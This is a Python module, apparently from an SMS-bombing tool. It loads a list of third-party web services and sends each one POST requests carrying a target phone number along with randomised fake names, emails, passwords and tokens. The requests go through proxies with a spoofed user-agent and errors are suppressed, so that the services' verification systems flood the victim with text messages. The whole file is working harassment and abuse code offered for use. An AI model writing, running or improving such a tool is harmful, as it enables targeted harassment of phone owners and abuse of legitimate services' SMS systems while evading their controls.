import json
import requests
import API.SMS.randomData as randomData

def getServices(file="API/SMS/SMS.json"):
    with open(file, "r", encoding="utf-8", errors="ignore") as services:
        return json.load(services)["services"]

def getProxys(file="API/SMS/proxy.json"):
    with open(file, "r") as proxys:
        return json.load(proxys)["proxy"]

def getDomain(url):
    return url.split("/")[2]

def transformPhone(phone, i):
    if i == 5:
        return (
            "+"
            + phone[0]
            + " ("
            + phone[1:4]
            + ") "
            + phone[4:7]
            + " "
            + phone[7:9]
            + " "
            + phone[9:11]
        )

headers = {"X-Requested-With": "XMLHttpRequest","Connection": "keep-alive","Pragma": "no-cache","Cache-Control": "no-cache","Accept-Encoding": "gzip, deflate, br","User-agent": randomData.random_useragent(),}

class Service:
    def __init__(self, service):
        self.service = service
        self.proxy = getProxys()
        self.timeout = 10

    def parseData(self, phone):
        payload = None
        if "data" in self.service:
            dataType = "data"
            payload = self.service["data"]
        elif "json" in self.service:
            dataType = "data"
            payload = self.service["json"]
        else:
            payload = json.dumps({"url": self.service["url"]})
            dataType = "url"
        for old, new in {
            "'": '"',
            "%phone%": phone,
            "%phone5%": transformPhone(phone, 5),
            "%name%": randomData.random_name(),
            "%email%": randomData.random_email(),
            "%password%": randomData.random_password(),
            "%token%": randomData.random_token(),
        }.items():
            if old in payload:
                payload = payload.replace(old, new)
        return json.loads(payload), dataType

    def sendMessage(self, phone):
        url = self.service["url"]
        payload, dataType = self.parseData(phone)
        if "headers" in self.service:
            customHeaders = self.service["headers"]
            for key, value in json.loads(customHeaders.replace("'", '"')).items():
                headers[key] = value
        session = requests.Session()
        request = requests.Request("POST", url)
        request.headers = headers
        if dataType == "json":
            request.json = payload
        elif dataType == "data":
            request.data = payload
        elif dataType == "url":
            request.url = payload["url"]
        try:
            request = request.prepare()
            r = session.send(request, timeout=self.timeout, proxies=self.proxy)
            return r.status_code, url
        except:
            pass
